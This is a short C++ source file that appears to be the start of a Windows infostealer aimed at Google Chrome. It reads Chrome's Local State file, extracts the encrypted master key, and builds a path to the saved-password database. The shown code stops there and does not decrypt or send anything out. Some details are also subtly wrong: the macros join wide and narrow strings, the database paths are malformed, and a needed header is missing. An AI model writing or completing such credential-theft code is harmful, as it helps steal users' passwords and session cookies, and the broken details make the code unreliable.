#include "sqlite3.h"
#include "aes_gcm.h"
#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <string>
#include <iostream>
#include "json.hpp"

#define CHROME_USER_DATA L"\\Google\\Chrome\\User Data"
#define CHROME_LOCAL_STATE CHROME_USER_DATA##"\\Local State"
#define CHROME_USER_LOGIN CHROME_USER_DATA##"\\Default\\Login Data\\passwords.db"
#define CHROME_USER_COOKIES CHROME_USER_DATA##"\\Default\\Cookies\\cookies.db"

using namespace nlohmann;

int wmain()
{
    LPWSTR appDataLocal = new WCHAR[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataLocal) != S_OK)
    {
        wprintf(L"Failed to find local appdata folder!\n");
        return -1;
    }
    LPWSTR chromeSettings = new WCHAR[MAX_PATH]; 
    lstrcpy(chromeSettings, appDataLocal);
    chromeSettings = lstrcat(chromeSettings, CHROME_LOCAL_STATE);
    std::ifstream chromeLocalStateFile(chromeSettings);
    json chromeSettingsJsonified = json::parse(chromeLocalStateFile);

    std::string key = chromeSettingsJsonified["os_crypt"]["encrypted_key"].get<std::string>();
    LPWSTR chromePasswordsDB = new WCHAR[MAX_PATH];
    lstrcpy(chromePasswordsDB, appDataLocal);
    chromePasswordsDB = lstrcat(chromePasswordsDB, CHROME_USER_LOGIN);
    return 0;
}